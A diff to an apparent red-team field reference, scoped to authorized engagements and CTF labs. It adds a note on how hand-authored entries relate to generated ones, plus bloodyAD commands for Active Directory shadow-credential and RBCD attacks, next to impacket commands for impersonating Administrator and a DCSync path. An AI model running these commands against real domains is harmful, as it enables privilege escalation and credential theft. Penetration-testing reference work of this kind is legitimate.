@@ -14,6 +14,14 @@ entries/red/), which is canonical for them — edit the entry and run
 offensive/companion/gen-views.sh, not the lines here (CI rejects a hand-edit).
 Everything outside the markers is hand-authored as usual.
 
+Not every red corpus entry is projected here, and that asymmetry is DELIBERATE:
+the companion is the red<->blue PAIRING anchor (its blue twin projects cleanly into
+PURPLE-TEAM.md because a detection carries no extra field context), but several red
+attacks live here as hand-authored prose instead — a fuller field reference than the
+bare corpus command, with the sharper token (`<dc-ip>` not the projected `<ip_address>`),
+inline pedagogy, and follow-up steps the entry omits. So a red entry WITHOUT a
+`# companion:gen` block here is projecting-by-omission on purpose, not missing.
+
 SCOPE: authorized engagements (written ROE + scope) or your own CTF/HTB labs ONLY.
 Engagement DATA lives in ~/engagements (`mkengagement`), never in this repo.
 
@@ -330,6 +338,13 @@ impacket-addcomputer -computer-name '<machine_account>$' -computer-pass '<machin
 impacket-rbcd -delegate-from '<machine_account>$' -delegate-to '<target>$' -action write -dc-ip <ip_address> <domain>/<user>:<password>
 impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip_address> <domain>/'<machine_account>$':'<machine_password>'
 # companion:end rbcd-impacket
+
+# bloodyAD (apt pkg 'bloodyad'; the installed CLI is camelCase 'bloodyAD') — raw-LDAP swiss-army
+# knife for the same primitives (shadow-creds / RBCD / DACL / attribute writes)
+# over ONE LDAP channel; quieter than certipy+impacket once you already hold the write, and autobloody can
+# auto-walk a BloodHound-graphed path end to end:
+bloodyAD -u <user> -p <password> -d <domain> --host <ip_address> add shadowCredentials <target>   # KeyCredentialLink -> PKINIT -> NT hash
+bloodyAD -u <user> -p <password> -d <domain> --host <ip_address> add rbcd <target> '<machine_account>$'  # msDS-AllowedToActOnBehalfOfOtherIdentity
 
 # Unconstrained delegation — coerce a DC to you (TGT monitor on the unconstrained host) -> DCSync:
 # companion:gen unconstrained-deleg-tgt
